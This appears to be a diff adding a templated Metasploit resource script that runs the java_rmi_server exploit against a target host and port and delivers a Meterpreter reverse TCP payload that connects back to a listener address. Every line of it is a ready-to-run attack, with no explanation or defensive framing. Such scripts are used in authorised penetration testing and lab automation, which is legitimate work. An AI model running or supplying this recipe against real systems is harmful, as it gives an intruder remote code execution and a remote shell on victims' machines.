@@ -1,0 +1,6 @@
+use exploit/multi/misc/java_rmi_server
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST %%LHOST%%
+run
